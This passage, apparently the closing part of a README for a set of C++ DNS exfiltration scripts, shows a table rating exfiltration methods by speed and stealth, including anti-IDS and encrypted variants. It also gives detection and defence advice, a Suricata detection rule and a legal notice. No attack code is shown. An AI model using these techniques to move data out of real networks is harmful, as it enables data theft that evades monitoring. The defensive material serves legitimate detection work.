| 4 | CNAME | 25 B/s | High | Good | Text |
| 5 | MX | 25 B/s | High | Excellent | Email-safe |
| 6 | SRV | 20 B/s | High | Excellent | Service discovery |
| 7 | ANY | 60 B/s | Low | Medium | Fast exfil |
| 8 | DoH | 40 B/s | Very High | Excellent | Encrypted |
| 9 | DoT | 40 B/s | Very High | Excellent | Encrypted |
| 10 | Compressed | 100+ B/s | Medium | Good | Large text |
| 11 | ICMP-DNS | 20 B/s | High | Good | ICMP-only networks |
| 12 | Stealth | 15 B/s | Very High | Medium | Anti-IDS |
| 13 | Sequential | 30 B/s | Low | Poor | Streaming |
| 14 | Base64url | 40 B/s | Medium | Good | Compact |
| 15 | Reverse | 25 B/s | High | Medium | Anti-pattern |
| 16 | CNAME Chain | 40 B/s | High | Good | Chained |
| 17 | AES Encrypted | 30 B/s | High | Good | Confidential |
| 18 | IPv6 AAAA | 25 B/s | Very High | Excellent | IPv6-unaware |
| 19 | Multi-Server | 100+ B/s | Medium | Good | High bandwidth |
| 20 | Framework | Varies | Configurable | All | Universal |

## Detection & Defense

**Detection Methods:**
- Monitor for high DNS query rates per host
- Detect long subdomain labels (>50 chars)
- Watch for unusual DNS record types (NULL, SRV, TXT)
- Statistical analysis of query entropy
- Track entropy of subdomain names
- Correlation across DNS resolvers
- DNS tunnel detection (Fidelis, Cisco Umbrella, etc.)

**Defense Measures:**
- DNS firewalls with domain reputation
- Restrict outbound DNS to trusted resolvers only
- Block non-standard DNS ports (5353, 853, 5353)
- Use DNS over TLS/HTTPS for legitimate traffic
- Deep packet inspection for DNS tunneling
- Enforce DNS query rate limits
- Block known DNS tunneling domains
- Monitor for characteristic patterns

### Detection Rules (Suricata/Snort)
```
alert dns $HOME_NET any -> any 53 (
    msg:"Possible DNS Exfiltration";
    dns_query;
    pcre:"/^[a-z0-9]{40,}\./i";
    threshold: type limit, track by_src, count 100, seconds 60;
    sid:1000001; rev:1;
)
```

## Legal Notice

**ALL SCRIPTS ARE FOR EDUCATIONAL PURPOSES ONLY**

These C++ DNS exfiltration implementations demonstrate techniques for:
- Authorized penetration testing
- Security research and education
- Understanding defensive countermeasures
- Red team exercises with proper authorization

**UNAUTHORIZED USE IS ILLEGAL** under:
- Computer Fraud and Abuse Act (CFAA) — US
- Computer Misuse Act — UK
- Network and Information Systems Directive — EU
- Data protection laws (GDPR, CCPA)
- Local telecommunications and privacy laws

**PENALTIES INCLUDE**:
- Federal criminal charges
- Civil liability and damages
- Imprisonment up to 20+ years
- Permanent criminal record
- Significant fines

**RESPONSIBLE USE**:
- Obtain explicit written authorization
- Use only on systems you own or have permission to test
- Never exfiltrate production data without authorization
- Report findings to authorized parties only
- Follow responsible disclosure practices

**DEFENSIVE PRINCIPLES**:
- DNS is often overlooked in egress filtering
- Encrypt data at rest and in transit
- Monitor DNS traffic as a security signal
- Implement DNS response policy zones (RPZ)
- Consider DNS tunneling as a real threat vector

---

*This completes 20 unique DNS exfiltration techniques in C++, derived from concepts in "TCP/IP Illustrated, Volume 3" by W. Richard Stevens.*
